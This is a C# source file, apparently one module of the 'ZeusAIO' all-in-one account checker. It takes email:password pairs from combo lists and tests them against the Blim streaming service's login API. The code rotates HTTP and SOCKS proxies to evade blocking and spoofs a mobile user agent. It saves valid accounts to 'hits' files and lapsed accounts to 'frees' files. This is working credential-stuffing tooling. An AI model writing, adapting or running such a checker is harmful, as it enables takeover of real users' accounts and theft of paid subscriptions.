using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Blim
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Shopify Mobile/Android/8.26.0 (Build 32571 with API 22 on Samsung SM-N950N)";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                        string post = "{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"remember\":\"false\",\"clientId\":\"3\"}";
                        string text2 = httpRequest.Post("https://api.blim.com/account/login", post, "application/json;charset=UTF-8").ToString();
                        bool flag7 = text2.Contains("status\":\"Active");

                        if (flag7)
                        {
                            ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui== "2")
                                {
                                    Console.WriteLine("[HIT - BLIM] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Blim_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                            bool flag8 = text2.Contains("status\":\"Missing Payment") || text2.Contains("status\":\"Cancelled");
                            if (flag8)
                            {
                                ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - BLIM] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Blim_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                        }
                    }
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
    }
}
